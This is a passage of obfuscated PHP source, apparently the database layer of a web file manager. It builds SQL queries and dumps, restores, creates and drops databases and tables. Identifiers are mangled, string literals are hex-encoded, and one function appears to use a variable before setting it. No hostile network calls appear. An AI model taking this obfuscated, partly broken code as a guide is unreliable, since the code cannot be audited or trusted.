(is_array($Ò«Ì€‡) && $ì‚®â‚à[297] == $Ò«Ì€‡[0]) { $ö§½¯äô[] = $this->parseKey($­Öôëã˜); $’œøÑ™Ç[] = $Ò«Ì€‡[1]; } elseif (is_scalar($Ò«Ì€‡) || is_null($Ò«Ì€‡)) { $ö§½¯äô[] = $this->parseKey($­Öôëã˜); $’œøÑ™Ç[] = $this->parseValue($Ò«Ì€‡); } } $ßĞ†à‹ = ($‚†óè£Ã ? $ì‚®â‚à[912] : $ì‚®â‚à[913]) . $ì‚®â‚à[914] . $this->parseTable($¶²•Í¢·[$ì‚®â‚à[279]]) . $ì‚®â‚à[908] . implode($ì‚®â‚à[50], $ö§½¯äô) . $ì‚®â‚à[909] . implode($ì‚®â‚à[50], $’œøÑ™Ç) . $ì‚®â‚à[910]; $ßĞ†à‹ .= $this->parseLock(isset($¶²•Í¢·[$ì‚®â‚à[852]]) ? $¶²•Í¢·[$ì‚®â‚à[852]] : !1); $ßĞ†à‹ .= $this->parseComment(!empty($¶²•Í¢·[$ì‚®â‚à[354]]) ? $¶²•Í¢·[$ì‚®â‚à[354]] : $ì‚®â‚à[12]); return $this->execute($ßĞ†à‹, $this->parseBind(!empty($¶²•Í¢·[$ì‚®â‚à[285]]) ? $¶²•Í¢·[$ì‚®â‚à[285]] : array())); } public function selectInsert($À« ÀÕÖ, $–ÇÓ…ì©, $ÈËŠ—ºà = array()) { $çÜ¢´´  =& $_SERVER[ùÆÎÔ“Ñ]; $this->model = $ÈËŠ—ºà[$çÜ¢´´ [281]]; if (is_string($À« ÀÕÖ)) { $À« ÀÕÖ = explode($çÜ¢´´ [50], $À« ÀÕÖ); } array_walk($À« ÀÕÖ, array($this, $çÜ¢´´ [911])); $˜®¥÷Ã = $çÜ¢´´ [1045] . $this->parseTable($–ÇÓ…ì©) . $çÜ¢´´ [908] . implode($çÜ¢´´ [50], $À« ÀÕÖ) . $çÜ¢´´ [1023]; $˜®¥÷Ã .= $this->buildSelectSql($ÈËŠ—ºà); return $this->execute($˜®¥÷Ã, $this->parseBind(!empty($ÈËŠ—ºà[$çÜ¢´´ [285]]) ? $ÈËŠ—ºà[$çÜ¢´´ [285]] : array())); } public function update($„’™œ„, $…¼Ô±Üí) { $ŒÑ„ÇİÆ =& $_SERVER[ùÆÎÔ“Ñ]; $this->model = $…¼Ô±Üí[$ŒÑ„ÇİÆ[281]]; $Ô‹İÍÄ­ = $ŒÑ„ÇİÆ[1046] . $this->parseTable($…¼Ô±Üí[$ŒÑ„ÇİÆ[279]]) . $this->parseSet($„’™œ„) . $this->parseWhere(!empty($…¼Ô±Üí[$ŒÑ„ÇİÆ[275]]) ? $…¼Ô±Üí[$ŒÑ„ÇİÆ[275]] : $ŒÑ„ÇİÆ[12]) . $this->parseOrder(!empty($…¼Ô±Üí[$ŒÑ„ÇİÆ[365]]) ? $…¼Ô±Üí[$ŒÑ„ÇİÆ[365]] : $ŒÑ„ÇİÆ[12]) . $this->parseLimit(!empty($…¼Ô±Üí[$ŒÑ„ÇİÆ[292]]) ? $…¼Ô±Üí[$ŒÑ„ÇİÆ[292]] : $ŒÑ„ÇİÆ[12]) . $this->parseLock(isset($…¼Ô±Üí[$ŒÑ„ÇİÆ[852]]) ? $…¼Ô±Üí[$ŒÑ„ÇİÆ[852]] : !1) . $this->parseComment(!empty($…¼Ô±Üí[$ŒÑ„ÇİÆ[354]]) ? $…¼Ô±Üí[$ŒÑ„ÇİÆ[354]] : $ŒÑ„ÇİÆ[12]); return $this->execute($Ô‹İÍÄ­, $this->parseBind(!empty($…¼Ô±Üí[$ŒÑ„ÇİÆ[285]]) ? $…¼Ô±Üí[$ŒÑ„ÇİÆ[285]] : array())); } public function delete($®‘¢Ö·ß = array()) { $Ìˆõ ø =& $_SERVER[ùÆÎÔ“Ñ]; $this->model = $®‘¢Ö·ß[$Ìˆõ ø[281]]; $‚ã‘êì£ = $Ìˆõ ø[1047] . $this->parseTable($®‘¢Ö·ß[$Ìˆõ ø[279]]) . $this->parseWhere(!empty($®‘¢Ö·ß[$Ìˆõ ø[275]]) ? $®‘¢Ö·ß[$Ìˆõ ø[275]] : $Ìˆõ ø[12]) . $this->parseOrder(!empty($®‘¢Ö·ß[$Ìˆõ ø[365]]) ? $®‘¢Ö·ß[$Ìˆõ ø[365]] : $Ìˆõ ø[12]) . $this->parseLimit(!empty($®‘¢Ö·ß[$Ìˆõ ø[292]]) ? $®‘¢Ö·ß[$Ìˆõ ø[292]] : $Ìˆõ ø[12]) . $this->parseLock(isset($®‘¢Ö·ß[$Ìˆõ ø[852]]) ? $®‘¢Ö·ß[$Ìˆõ ø[852]] : !1) . $this->parseComment(!empty($®‘¢Ö·ß[$Ìˆõ ø[354]]) ? $®‘¢Ö·ß[$Ìˆõ ø[354]] : $Ìˆõ ø[12]); return $this->execute($‚ã‘êì£, $this->parseBind(!empty($®‘¢Ö·ß[$Ìˆõ ø[285]]) ? $®‘¢Ö·ß[$Ìˆõ ø[285]] : array())); } public function select($®¼±Œ¦¸ = array()) { $Õ»Ç‡Ğó =& $_SERVER[ùÆÎÔ“Ñ]; $this->model = $®¼±Œ¦¸[$Õ»Ç‡Ğó[281]]; $‘¿”ñ»Ç = $this->buildSelectSql($®¼±Œ¦¸); $¥•°Òƒ• = isset($®¼±Œ¦¸[$Õ»Ç‡Ğó[349]]) ? $®¼±Œ¦¸[$Õ»Ç‡Ğó[349]] : !1; if ($¥•°Òƒ•) { $Ûüº«— = is_string($¥•°Òƒ•[$Õ»Ç‡Ğó[94]]) ? $¥•°Òƒ•[$Õ»Ç‡Ğó[94]] : $Õ»Ç‡Ğó[1048] . md5($‘¿”ñ»Ç); $ïöŠ¾¥Ë = think_cache($Ûüº«—, $Õ»Ç‡Ğó[12], $¥•°Òƒ•); if (!1 !== $ïöŠ¾¥Ë) { return $ïöŠ¾¥Ë; } } $Òğ¹²Í™ = $this->query($‘¿”ñ»Ç, $this->parseBind(!empty($®¼±Œ¦¸[$Õ»Ç‡Ğó[285]]) ? $®¼±Œ¦¸[$Õ»Ç‡Ğó[285]] : array())); if ($¥•°Òƒ• && !1 !== $Òğ¹²Í™) { think_cache($Ûüº«—, $Òğ¹²Í™, $¥•°Òƒ•); } return $Òğ¹²Í™; } public function buildSelectSql($×¤»ó’’ = array()) { $é·’¿ÛÈ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($×¤»ó’’[$é·’¿ÛÈ[353]])) { if (strpos($×¤»ó’’[$é·’¿ÛÈ[353]], $é·’¿ÛÈ[50])) { list($æÜœÈ­ï, $ã‹øåçü) = explode($é·’¿ÛÈ[50], $×¤»ó’’[$é·’¿ÛÈ[353]]); } else { $æÜœÈ­ï = $×¤»ó’’[$é·’¿ÛÈ[353]]; } $æÜœÈ­ï = $æÜœÈ­ï ? $æÜœÈ­ï : 1; $ã‹øåçü = isset($ã‹øåçü) ? $ã‹øåçü : (is_numeric($×¤»ó’’[$é·’¿ÛÈ[292]]) ? $×¤»ó’’[$é·’¿ÛÈ[292]] : 20); $«Ç¬”µş = $ã‹øåçü * ((int) $æÜœÈ­ï - 1); $×¤»ó’’[$é·’¿ÛÈ[292]] = $«Ç¬”µş . $é·’¿ÛÈ[50] . $ã‹øåçü; } if (think_config($é·’¿ÛÈ[1049])) { $½í±®áŸ = $é·’¿ÛÈ[1050] . md5(serialize($×¤»ó’’)); $ŠÅè†ÅÅ = think_cache($½í±®áŸ); if ($ŠÅè†ÅÅ) { return $ŠÅè†ÅÅ; } } $Ì˜ƒš·‡ = $this->parseSql($this->selectSql, $×¤»ó’’); $Ì˜ƒš·‡ .= $this->parseLock(isset($×¤»ó’’[$é·’¿ÛÈ[852]]) ? $×¤»ó’’[$é·’¿ÛÈ[852]] : !1); if (isset($½í±®áŸ)) { think_cache($½í±®áŸ, $Ì˜ƒš·‡); } return $Ì˜ƒš·‡; } public function parseSql($óô’š—, $É²”äûª = array()) { $ªóÒôŸ¶ =& $_SERVER[ùÆÎÔ“Ñ]; $óô’š— = str_replace(array($ªóÒôŸ¶[1051], $ªóÒôŸ¶[1052], $ªóÒôŸ¶[1053], $ªóÒôŸ¶[1054], $ªóÒôŸ¶[1055], $ªóÒôŸ¶[1056], $ªóÒôŸ¶[1057], $ªóÒôŸ¶[1058], $ªóÒôŸ¶[1059], $ªóÒôŸ¶[1060], $ªóÒôŸ¶[1061]), array($this->parseTable("{$É²”äûª[$ªóÒôŸ¶[279]]}"), $this->parseDistinct(isset($É²”äûª[$ªóÒôŸ¶[1062]]) ? $É²”äûª[$ªóÒôŸ¶[1062]] : !1), $this->parseField(!empty($É²”äûª[$ªóÒôŸ¶[273]]) ? $É²”äûª[$ªóÒôŸ¶[273]] : $ªóÒôŸ¶[188]), $this->parseJoin(!empty($É²”äûª[$ªóÒôŸ¶[282]]) ? $É²”äûª[$ªóÒôŸ¶[282]] : $ªóÒôŸ¶[12]), $this->parseWhere(!empty($É²”äûª[$ªóÒôŸ¶[275]]) ? $É²”äûª[$ªóÒôŸ¶[275]] : $ªóÒôŸ¶[12]), $this->parseGroup(!empty($É²”äûª[$ªóÒôŸ¶[515]]) ? $É²”äûª[$ªóÒôŸ¶[515]] : $ªóÒôŸ¶[12]), $this->parseHaving(!empty($É²”äûª[$ªóÒôŸ¶[1063]]) ? $É²”äûª[$ªóÒôŸ¶[1063]] : $ªóÒôŸ¶[12]), $this->parseOrder(!empty($É²”äûª[$ªóÒôŸ¶[365]]) ? $É²”äûª[$ªóÒôŸ¶[365]] : $ªóÒôŸ¶[12]), $this->parseLimit(!empty($É²”äûª[$ªóÒôŸ¶[292]]) ? $É²”äûª[$ªóÒôŸ¶[292]] : $ªóÒôŸ¶[12]), $this->parseUnion(!empty($É²”äûª[$ªóÒôŸ¶[347]]) ? $É²”äûª[$ªóÒôŸ¶[347]] : $ªóÒôŸ¶[12]), $this->parseComment(!empty($É²”äûª[$ªóÒôŸ¶[354]]) ? $É²”äûª[$ªóÒôŸ¶[354]] : $ªóÒôŸ¶[12])), $óô’š—); return $óô’š—; } public function getLastSql($½î’ØÖª = '') { return $½î’ØÖª ? $this->modelSql[$½î’ØÖª] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($˜Ùò–à³) { return addslashes($˜Ùò–à³); } public function setModel($Ÿï«ïâ·) { $this->model = $Ÿï«ïâ·; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($½íİ„Ø = array()) { $â™ü½ºš =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($½íİ„Ø)) { $½íİ„Ø = $GLOBALS[$â™ü½ºš[6]][$â™ü½ºš[21]]; } $this->database = $½íİ„Ø; } public function model($è¯ùşÅ = '') { return new ModelBase($è¯ùşÅ, $_SERVER[ùÆÎÔ“Ñ][12], $this->database); } public function db($Ü©«³Ñ£ = false) { $÷¾âÜí =& $_SERVER[ùÆÎÔ“Ñ]; $Ø‹Ò–® = array_change_key_case($this->database); if ($this->dbType() == $÷¾âÜí[13] || !$Ü©«³Ñ£) { return $this->model()->db(); } $»ÕÅ±–­ = $Ø‹Ò–®[$÷¾âÜí[977]]; $Ø‹Ò–®[$÷¾âÜí[977]] = $÷¾âÜí[12]; if ($Ø‹Ò–®[$÷¾âÜí[972]] == $÷¾âÜí[969]) { $°Ã´¿°Á = $Ø‹Ò–®[$÷¾âÜí[978]]; $Ø‹Ò–®[$÷¾âÜí[978]] = substr($°Ã´¿°Á, 0, strrpos($°Ã´¿°Á, $÷¾âÜí[1064])); } $this->database = $Ø‹Ò–®; $ÎîÈÊ¡œ = $this->model()->db(); try { $ù±¥èĞ˜ = $ÎîÈÊ¡œ->execute("\x73\150\x6f\x77\40\x64\x61\164\141\x62\141\x73\x65\163\40\154\151\x6b\145\x20\x27{$»ÕÅ±–­}\47"); } catch (Exception $ƒÕú¿¼) { } if (!$ù±¥èĞ˜) { $ÎîÈÊ¡œ->execute("\x63\x72\x65\141\x74\145\40\x64\141\x74\141\142\x61\x73\x65\x20\x60{$»ÕÅ±–­}\x60"); } $Ø‹Ò–®[$÷¾âÜí[977]] = $»ÕÅ±–­; if ($Ø‹Ò–®[$÷¾âÜí[972]] == $÷¾âÜí[969]) { $Ø‹Ò–®[$÷¾âÜí[978]] .= $÷¾âÜí[1064] . $»ÕÅ±–­; } $this->database = $Ø‹Ò–®; $ÎîÈÊ¡œ->execute("\x75\x73\x65\40\x60{$»ÕÅ±–­}\x60"); return $ÎîÈÊ¡œ; } public function createTable($Àü®Ÿæé, &$ıºÉ¹¥ó) { $Ô¶‘ª½ =& $_SERVER[ùÆÎÔ“Ñ]; if (!IO::exist($Àü®Ÿæé)) { ActionCall($Ô¶‘ª½[1065], !0, 0); show_json(LNG($Ô¶‘ª½[1066]), !1); } $ø¶»¸¡ = $this->model()->db(); $ÑÊ‚ˆÔé = sqlSplit(IO::getContent($Àü®Ÿæé)); foreach ($ÑÊ‚ˆÔé as $šËÛç) { $î©Şî¨› = stripos($šËÛç, $Ô¶‘ª½[1067]) === 0; if ($î©Şî¨›) { $ıºÉ¹¥ó->task[$Ô¶‘ª½[787]] += 1; } $ø¶»¸¡->execute($šËÛç); if ($î©Şî¨›) { preg_match($Ô¶‘ª½[1068], $šËÛç, $•Ê¿ªíš); $ıºÉ¹¥ó->task[$Ô¶‘ª½[1069]] = $•Ê¿ªíš[1]; $ıºÉ¹¥ó->update(1); } } } public function insertTable($û¾ãç¾Ã, &$ˆª”ï„¶) { $²Â†æİ =& $_SERVER[ùÆÎÔ“Ñ]; $î°¥˜¬ = $this->model()->db(); $£şú—Ä• = $ÎÄ«Â¯’ ? array($ÎÄ«Â¯’) : $î°¥˜¬->getTables(); foreach ($û¾ãç¾Ã as $ÚõŞ¥ş‰) { $ÎÄ«Â¯’ = basename($ÚõŞ¥ş‰, $²Â†æİ[789]); if (!in_array($ÎÄ«Â¯’, $£şú—Ä•)) { continue; } $ˆª”ï„¶->task[$²Â†æİ[1069]] = $ÎÄ«Â¯’; if (get_filesize($ÚõŞ¥ş‰) == 0) { continue; } $Âãû¸Ææ = $this->sqlToDb($ÚõŞ¥ş‰, $ˆª”ï„¶); if (!$Âãû¸Ææ) { ActionCall($²Â†æİ[1065], !0, 0); show_json(LNG($²Â†æİ[1070]) . "\x5b{$ÎÄ«Â¯’}\135", !1); } } } public function sqlFromDb($¤Å±¾üè, $¦†å«•, &$ ã¿¤Ç°, $íãßÇ«Ğ = '') { if ($ ã¿¤Ç°) { $ ã¿¤Ç°->task[$_SERVER[ùÆÎÔ“Ñ][1069]] = $¤Å±¾üè; } $ß¼ØÏæ = $this->model($¤Å±¾üè); $ îÉúø = 0; $—îËÍ‹î = 0; $­™±¼í² = 10000; $‚¦›„ÒÁ = fopen($¦†å«•, $_SERVER[ùÆÎÔ“Ñ][1071]); $Ó×ï¾ı¤ = $ß¼ØÏæ->getPk(); $Ï¨Ê‚şİ = $ß¼ØÏæ->getDbFields(); $ãé™ƒÚë = $_SERVER[ùÆÎÔ“Ñ][12]; if ($GLOBALS[$_SERVER[ùÆÎÔ“Ñ][788]] && in_array($¤Å±¾üè, array($_SERVER[ùÆÎÔ“Ñ][1072], $_SERVER[ùÆÎÔ“Ñ][1073]))) { $ãé™ƒÚë = $¤Å±¾üè; } do { $ôóÖ¯Ï² = array($Ó×ï¾ı¤ => array($_SERVER[ùÆÎÔ“Ñ][1019], $—îËÍ‹î)); $µ…üš « = $ß¼ØÏæ->where($ôóÖ¯Ï²)->field($Ï¨Ê‚şİ)->order($Ó×ï¾ı¤ . $_SERVER[ùÆÎÔ“Ñ][1074])->limit($­™±¼í²)->select(); $µ…üš « = !empty($µ…üš «) ? $µ…üš « : array(); if (!($ªòÍ±°¢ = count($µ…üš «))) { break; } $ÅŞ“…© = end($µ…üš «); $—îËÍ‹î = $ÅŞ“…©[$Ó×ï¾ı¤]; $¦šò¤Ì¼ = array(); foreach ($µ…üš « as $¾à÷¡É°) { if ($ãé™ƒÚë) { if ($¤Å±¾üè == $_SERVER[ùÆÎÔ“Ñ][1072]) { if ($¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][33]] == $_SERVER[ùÆÎÔ“Ñ][1075]) { $É–ãÊ = json_decode($¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][374]], !0); if ($É–ãÊ[$_SERVER[ùÆÎÔ“Ñ][32]] == $GLOBALS[$_SERVER[ùÆÎÔ“Ñ][788]] && $É–ãÊ[$_SERVER[ùÆÎÔ“Ñ][751]] != 1) { continue; } } } else { if ($¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][33]] == $_SERVER[ùÆÎÔ“Ñ][1076] && $¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][94]] == $_SERVER[ùÆÎÔ“Ñ][780]) { continue; } } } if ($íãßÇ«Ğ) { $¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][84]] = "\173\151\157\x3a{$íãßÇ«Ğ}\175" . substr($¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][84]], strlen("\x7b\x69\157\x3a{$¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][818]]}\175")); $¾à÷¡É°[$_SERVER[ùÆÎÔ“Ñ][818]] = $íãßÇ«Ğ; } $¦šò¤Ì¼[] = $_SERVER[ùÆÎÔ“Ñ][1077] . $this->sqlEncode($¾à÷¡É°) . $_SERVER[ùÆÎÔ“Ñ][1078]; } $ˆ±äÙâÏ = "\x49\x4e\x53\x45\x52\x54\x20\x49\116\x54\117\40\140{$¤Å±¾üè}\x60\x20\x28\x60" . implode($_SERVER[ùÆÎÔ“Ñ][1079], $Ï¨Ê‚şİ) . $_SERVER[ùÆÎÔ“Ñ][1080]; fwrite($‚¦›„ÒÁ, $ˆ±äÙâÏ . implode($_SERVER[ùÆÎÔ“Ñ][1081], $¦šò¤Ì¼) . $_SERVER[ùÆÎÔ“Ñ][71] . PHP_EOL); $ îÉúø += $ªòÍ±°¢; if ($ ã¿¤Ç°) { $ ã¿¤Ç°->update($ªòÍ±°¢); } } while ($­™±¼í² == $ªòÍ±°¢); fclose($‚¦›„ÒÁ); return $ îÉúø; } public function sqlToDb($ÚÏ™ÍÂ´, &$—Áâ†öë) { $±ı¦Á· =& $_SERVER[ùÆÎÔ“Ñ]; $ ßœÄİ¦ = $this->model()->db(); $²ÃŠ’µ¤ = @fopen($ÚÏ™ÍÂ´, $±ı¦Á·[1082]); if (!$²ÃŠ’µ¤) { return !1; } $¢œ¼²™ı = 0; $òíôÚ€¥ = $±ı¦Á·[12]; $†ÄÑ˜³² = array(); $„û§èê· = $this->dbType(); $Ø¡ç  = $„û§èê· == $±ı¦Á·[13] ? 500 : 2000; $Ã¦ŠŸÓª = basename($ÚÏ™ÍÂ´, $±ı¦Á·[789]); $¾ãô¸‡ = 0; $Œ³´àœ“ = 4194304 - 104858; $®•Ü–“ = 1000000 - 104858; while (!feof($²ÃŠ’µ¤)) { $ÈŠêŒÄø = trim(fgets($²ÃŠ’µ¤)); if (!$ÈŠêŒÄø) { continue; } $“êË§Ò = $this->sqlDecode($ÈŠêŒÄø, $„û§èê·, $Ã¦ŠŸÓª); if (stripos($“êË§Ò, $±ı¦Á·[355]) === 0) { if (!$òíôÚ€¥) { $òíôÚ€¥ = $“êË§Ò . $±ı¦Á·[53]; } continue; } if ($—Áâ†öë) { $—Áâ†öë->task[$±ı¦Á·[787]] += 1; } $¢œ¼²™ı++; $†ÄÑ˜³²[] = rtrim(rtrim(trim($“êË§Ò), $±ı¦Á·[50]), $±ı¦Á·[71]); $ÔË€Ú¾™ = null; $ÓÊˆË…å = strlen($“êË§Ò); $¾ãô¸‡ += $ÓÊˆË…å; if ($¾ãô¸‡ >= ($Ø¡ç  == 500 ? $®•Ü–“ : $Œ³´àœ“)) { $ÔË€Ú¾™ = array_pop($†ÄÑ˜³²); if ($¢œ¼²™ı > 1) { $¢œ¼²™ı--; } } if ($¢œ¼²™ı >= $Ø¡ç  || $ÔË€Ú¾™) { $“êË§Ò = $òíôÚ€¥ . implode($±ı¦Á·[50], $†ÄÑ˜³²); if (!$ ßœÄİ¦->execute($“êË§Ò)) { return !1; } if ($—Áâ†öë) { $—Áâ†öë->update($¢œ¼²™ı); } $†ÄÑ˜³² = array(); $¢œ¼²™ı = 0; $¾ãô¸‡ = 0; if ($ÔË€Ú¾™) { $†ÄÑ˜³² = array($ÔË€Ú¾™); $¢œ¼²™ı = 1; $¾ãô¸‡ = $ÓÊˆË…å; } } } fclose($²ÃŠ’µ¤); if (!empty($†ÄÑ˜³²)) { $“êË§Ò = $òíôÚ€¥ . implode($±ı¦Á·[50], $†ÄÑ˜³²); if (!$ ßœÄİ¦->execute($“êË§Ò)) { return !1; } if ($—Áâ†öë) { $—Áâ†öë->update($¢œ¼²™ı); } } return !0; } public function dropTable($Ëƒ½é¿§ = null) { $½¦ŸÊÃ÷ = $this->model()->db(); $‚Â–ØüÁ = $Ëƒ½é¿§ ? array($Ëƒ½é¿§) : $½¦ŸÊÃ÷->getTables(); if (!$‚Â–ØüÁ) { return; } foreach ($‚Â–ØüÁ as $Ëƒ½é¿§) { if ($Ëƒ½é¿§) { $Ëƒ½é¿§ = strtolower($Ëƒ½é¿§); } else { continue; } $½¦ŸÊÃ÷->execute("\144\x72\157\160\40\x74\x61\142\x6c\x65\40\151\x66\40\145\x78\151\163\x74\x73\x20\140{$Ëƒ½é¿§}\x60"); } } private function sqlEncode($¬«Ğ­èç) { $¤»¶œØş =& $_SERVER[ùÆÎÔ“Ñ]; $Ó…à­ÔÑ = array(); foreach ($¬«Ğ­èç as $ºÉ¬İı) { if (is_array($ºÉ¬İı)) { $ºÉ¬İı = json_encode_force($ºÉ¬İı); } $ºÉ¬İı = addslashes($ºÉ¬İı); $ºÉ¬İı = str_replace(array($¤»¶œØş[1083], $¤»¶œØş[231]), array($¤»¶œØş[1084], $¤»¶œØş[1085]), $ºÉ¬İı); $Ó…à­ÔÑ[] = str_replace($¤»¶œØş[58], $¤»¶œØş[1086], $ºÉ¬İı); } return $¤»¶œØş[58] . implode($¤»¶œØş[1087], $Ó…à­ÔÑ) . $¤»¶œØş[58]; } private function sqlDecode($’ç³ñíä, $ïôË»ç†, $üë¯ç´ = '') { $£íÑ³ï´ =& $_SERVER[ùÆÎÔ“Ñ]; $’ç³ñíä = str_replace(array($£íÑ³ï´[1084], $£íÑ³ï´[1085]), array($£íÑ³ï´[1083], $£íÑ³ï´[231]), $’ç³ñíä); if ($ïôË»ç† == $£íÑ³ï´[13]) { return $üë¯ç´ != $£íÑ³ï´[1088] ? stripslashes($’ç³ñíä) : $’ç³ñíä; } if ($üë¯ç´ == $£íÑ³ï´[1088]) { $’ç³ñíä = str_replace($£íÑ³ï´[1089], $£íÑ³ï´[118], stripslashes($’ç³ñíä)); } return $’ç³ñíä; } public function getSqlFile($à–ªÁ … = '') { $¹ƒú¦í… =& $_SERVER[ùÆÎÔ“Ñ]; $®½şÑä = $this->dbType(!0); $Å°²Ñ¡´ = CONTROLLER_DIR . "\x69\156\x73\x74\x61\154\154\x2f\144\141\164\141\57{$®½şÑä}\56\163\161\154"; $ì×˜å« = file_get_contents($Å°²Ñ¡´); $¿øÙŠ£¯ = $¹ƒú¦í…[1090] . ($®½şÑä == $¹ƒú¦í…[805] ? $¹ƒú¦í…[1091] : $¹ƒú¦í…[1092]) . $¹ƒú¦í…[1093]; preg_match_all($¿øÙŠ£¯, $ì×˜å«, $ÛÁËğÃ¨); $ ’À×ã = $ÛÁËğÃ¨[1]; $èªåƒ–‡ = $this->model()->db(); $ı¯œÁ¹´ = $èªåƒ–‡->getTables(); $Ä•şœúÅ = TEMP_FILES . $¹ƒú¦í…[1094] . date($¹ƒú¦í…[752]) . $¹ƒú¦í…[8]; del_dir($Ä•şœúÅ); mk_dir($Ä•şœúÅ); $¿©´æ±Ú = $Ä•şœúÅ . $¹ƒú¦í…[1095]; $é‹ÒšÛ£ = $Ä•şœúÅ . $¹ƒú¦í…[1096]; $ÈªğÜÌ± = $®½şÑä == $¹ƒú¦í…[13] ? $¹ƒú¦í…[805] : $¹ƒú¦í…[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\x61\154\x6c\x2f\144\x61\164\x61\x2f{$ÈªğÜÌ±}\x2e\x73\x71\x6c", $Ä•şœúÅ); @touch($Ä•şœúÅ . $®½şÑä . $¹ƒú¦í…[789]); $€¾›¦œ = fopen($¿©´æ±Ú, $¹ƒú¦í…[1071]); $ğí¸Ëâã = fopen($é‹ÒšÛ£, $¹ƒú¦í…[1071]); if ($®½şÑä == $¹ƒú¦í…[13]) { $ı¯œÁ¹´ = array_diff($ı¯œÁ¹´, array($¹ƒú¦í…[785], $¹ƒú¦í…[786])); $Ë¶®ÖÒ˜ = array($¹ƒú¦í…[1097], $¹ƒú¦í…[1098], $¹ƒú¦í…[1099]); fwrite($ğí¸Ëâã, implode(PHP_EOL, $Ë¶®ÖÒ˜) . PHP_EOL . PHP_EOL); foreach ($ı¯œÁ¹´ as $Ö‹ÒóûÜ) { $ÊŠ‰àíî = $this->sqlFromSqlite($Ö‹ÒóûÜ); if (!$ÊŠ‰àíî[$¹ƒú¦í…[13]]) { continue; } fwrite($ğí¸Ëâã, $ÊŠ‰àíî[$¹ƒú¦í…[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ö‹ÒóûÜ, $ ’À×ã)) { fwrite($€¾›¦œ, $ÊŠ‰àíî[$¹ƒú¦í…[805]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ı¯œÁ¹´ as $Ö‹ÒóûÜ) { $ÊŠ‰àíî = $this->sqlFromMysql($Ö‹ÒóûÜ); if (!$ÊŠ‰àíî[$¹ƒú¦í…[805]]) { continue; } fwrite($€¾›¦œ, $ÊŠ‰àíî[$¹ƒú¦í…[805]] . PHP_EOL . PHP_EOL); if (!in_array($Ö‹ÒóûÜ, $ ’À×ã)) { fwrite($ğí¸Ëâã, $ÊŠ‰àíî[$¹ƒú¦í…[13]] . PHP_EOL . PHP_EOL); } } } fclose($€¾›¦œ); fclose($ğí¸Ëâã); $ì×˜å« = array($¹ƒú¦í…[805] => $¿©´æ±Ú, $¹ƒú¦í…[13] => $é‹ÒšÛ£); return $à–ªÁ … ? $ì×˜å«[$à–ªÁ …] : $ì×˜å«; } public function dbType($®¢‚¯Ìú = false) { $ùèª¾ï =& $_SERVER[ùÆÎÔ“Ñ]; $şÄ¹æÑı = $®¢‚¯Ìú ? $GLOBALS[$ùèª¾ï[6]][$ùèª¾ï[21]] : $this->database; $şÄ¹æÑı = array_change_key_case($şÄ¹æÑı); $²†£´ó· = $şÄ¹æÑı[$ùèª¾ï[972]]; if ($²†£´ó· == $ùèª¾ï[969]) { $ƒÑÅÈ³ş = explode($ùèª¾ï[4], $şÄ¹æÑı[$ùèª¾ï[978]]); $²†£´ó· = $ƒÑÅÈ³ş[0]; } $í‹µÖ­ò = array($ùèª¾ï[1100] => $ùèª¾ï[13], $ùèª¾ï[917] => $ùèª¾ï[805]); if (isset($í‹µÖ­ò[$²†£´ó·])) { $²†£´ó· = $í‹µÖ­ò[$²†£´ó·]; } return $²†£´ó·; } public function sqlFromMysql($ĞïüìÚ, $°ˆèµåÅ = '') { $¡ø‡Ÿµã =& $_SERVER[ùÆÎÔ“Ñ]; $ÃŸ¬Ûšú = $this->model()->db(); $ìè§ºæ­ = $ÃŸ¬Ûšú->query($¡ø‡Ÿµã[1101] . $ĞïüìÚ . $¡ø‡Ÿµã[385]); if (!$ìè§ºæ­ || !$ìè§ºæ­[0]) { return !1; } $ƒ¶öÑÙÚ = _get($ìè§ºæ­[0], $¡ø‡Ÿµã[1102], $¡ø‡Ÿµã[12]); if (!$ƒ¶öÑÙÚ) { return !1; } $±¨äÕÙ† = "\104\x52\117\120\x20\x54\x41\102\114\x45\40\111\x46\40\105\x58\111\123\x54\123\40\x60{$ĞïüìÚ}\140\x3b" . PHP_EOL . $ƒ¶öÑÙÚ . $¡ø‡Ÿµã[71]; if ($°ˆèµåÅ && $°ˆèµåÅ == $¡ø‡Ÿµã[805]) { return $±¨äÕÙ†; } $·‚ÎÏ¨‘ = array_change_key_case($GLOBALS[$¡ø‡Ÿµã[6]][$¡ø‡Ÿµã[21]]); $ÀÅ¦Ôéù = $·‚ÎÏ¨‘[$¡ø‡Ÿµã[977]]; $ÊèÆ”ÄÇ = $¡ø‡Ÿµã[1103] . $ÀÅ¦Ôéù . $¡ø‡Ÿµã[1104] . $ĞïüìÚ . $¡ø‡Ÿµã[58]; $’¥İ‰²ä = $¡ø‡Ÿµã[1105] . $ĞïüìÚ . $¡ø‡Ÿµã[905]; $¦Ô—èŒÕ = $ÃŸ¬Ûšú->query($ÊèÆ”ÄÇ); if (empty($¦Ô—èŒÕ)) { $Ù•¯ê¬¬ = array($¡ø‡Ÿµã[805] => $¡ø‡Ÿµã[12], $¡ø‡Ÿµã[13] => $¡ø‡Ÿµã[12]); return $°ˆèµåÅ ? $Ù•¯ê¬¬[$°ˆèµåÅ] : $Ù•¯ê¬¬; } $®†¸êşˆ = $ÃŸ¬Ûšú->query($’¥İ‰²ä); $¸ÀäÚ¯Š = $¡ø‡Ÿµã[12]; $¯¯³ëŞ = array(); foreach ($®†¸êşˆ as $§ßØ–ï’) { if (!$¸ÀäÚ¯Š && $§ßØ–ï’[$¡ø‡Ÿµã[1106]] == $¡ø‡Ÿµã[1107]) { $¸ÀäÚ¯Š = $§ßØ–ï’[$¡ø‡Ÿµã[1108]]; } if (isset($¯¯³ëŞ[$§ßØ–ï’[$¡ø‡Ÿµã[1106]]])) { 